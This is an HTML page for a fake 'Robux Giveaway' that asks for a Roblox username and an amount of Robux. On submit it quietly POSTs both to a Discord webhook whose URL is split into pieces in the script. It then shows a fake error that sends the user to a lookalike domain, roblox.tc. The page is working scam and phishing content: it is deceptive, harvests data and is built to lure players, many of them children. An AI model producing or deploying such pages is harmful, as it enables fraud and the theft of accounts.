<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>üéÅ Robux Giveaway</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://images.unsplash.com/photo-1608889170913-7b6d3b1e7c0c') no-repeat center center fixed;
      background-size: cover;
      color: white;
      overflow: hidden;
    }

    .fog {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://i.imgur.com/8fKQZ5P.png') repeat;
      opacity: 0.2;
      pointer-events: none;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      max-width: 400px;
      margin: 100px auto;
      background: rgba(0, 0, 0, 0.8);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px #00ff88;
      text-align: center;
    }

    h1 {
      margin-bottom: 20px;
      color: #00ff88;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      font-size: 16px;
    }

    button {
      background-color: #00ff88;
      color: black;
      font-weight: bold;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
    }

    .popup {
      display: none;
      margin-top: 20px;
      background: #111;
      padding: 20px;
      border-radius: 10px;
      border-left: 4px solid red;
    }

    .popup p {
      margin: 10px 0;
      color: #ff4444;
    }

    .popup a {
      display: inline-block;
      background-color: #007bff;
      color: white;
      padding: 10px 15px;
      border-radius: 8px;
      text-decoration: none;
      margin-top: 10px;
    }

    .popup a:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="fog"></div>
  <div class="container">
    <h1>üéÑ Robux Giveaway</h1>
    <form id="robuxForm">
      <input type="text" id="nick" placeholder="Enter your Roblox Nick" required />
      <input type="number" id="robux" placeholder="Amount of Robux" required />
      <button type="submit">Send Robux</button>
    </form>
    <div class="popup" id="errorPopup">
      <p>‚ùå ERROR: YOU NEED TO JOIN THE GROUP TO EARN ROBUX</p>
      <p>üí∏ TO RECEIVE YOUR ROBUX, JOIN THE GROUP TO REDEEM ROBUX üëá</p>
      <a href="https://www.roblox.tc/communities/1671585164/RobuxGiveaway" target="_blank">JOIN THE GROUP</a>
    </div>
  </div>

  <script>
    const form = document.getElementById("robuxForm");
    const popup = document.getElementById("errorPopup");

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      popup.style.display = "block";

      const nick = document.getElementById("nick").value;
      const robux = document.getElementById("robux").value;

      
      const part1 = "https://discord.com/api/webhooks/";
      const part2 = "1395175802638700655";
      const part3 = "M1-TjcOt8_Gvxy6mKcMbOZrU12AbDyCJ3yX_zDCjctyR6JCQgyiXL0LXiAT1y_0-LA-c";
      const webhookURL = part1 + part2 + "/" + part3;

      
      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: nick,
          robux: robux
        })
      }).then(res => console.log("Dados enviados"))
        .catch(err => console.error("Erro:", err));
    });
  </script>
</body>
</html>
